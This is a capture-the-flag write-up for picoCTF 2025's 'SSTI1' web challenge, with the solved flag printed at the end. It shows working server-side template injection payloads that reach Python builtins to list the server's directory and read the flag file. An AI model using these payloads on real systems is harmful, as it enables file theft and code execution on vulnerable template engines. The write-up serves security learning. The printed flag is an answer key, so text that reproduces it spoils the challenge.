# SSTI1

| Field | Value |
| --- | --- |
| Platform | picoCTF 2025 |
| Category | Web Exploitation |
| Difficulty | Easy |
| Date | 2025-04-29 |

## Overview

Assess how the application renders user-provided announcements.

<details>
<summary>Original challenge description</summary>

I made a cool website where you can announce whatever you want! Try it out! I heard templating is a cool and modular way to build web apps! Check out my website [here](http://rescued-float.picoctf.net:56708/)!

</details>

## Analysis

The server evaluated expressions supplied through the announcement form as template code.

The hint for this challenge is **Server Side Template Injection**
If we try `{{ 8*8 }}` payload in input area, we'll have a output `64`
Then we need to list directory:
```python
{{ self.__init__.__globals__.__builtins__.__import__('os').listdir('.') }}
```
Output:
`['app.py', '__pycache__', 'flag', 'requirements.txt']`

Now lets read a `flag` file:
```python
{{ self.__init__.__globals__.__builtins__.open('flag').read() }}
```

## Result

`picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_753eca43}`
